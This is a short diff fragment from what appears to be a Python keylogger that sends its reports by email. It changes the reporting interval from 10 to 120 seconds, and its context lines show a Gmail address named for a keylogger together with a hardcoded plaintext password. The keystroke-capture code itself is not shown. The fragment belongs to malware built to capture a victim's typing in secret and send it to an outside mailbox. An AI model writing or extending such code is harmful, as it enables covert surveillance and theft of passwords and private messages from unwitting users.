@@ -4,7 +4,7 @@ import smtplib # for sending email using SMTP protocol (gmail)
 from threading import Timer
 from datetime import datetime
 
-SEND_REPORT_EVERY = 10 # in seconds, 60 means 1 minute and so on
+SEND_REPORT_EVERY = 120 # in seconds
 EMAIL_ADDRESS = "middlemankeylogger@gmail.com"
 EMAIL_PASSWORD = "Middleman123"
 
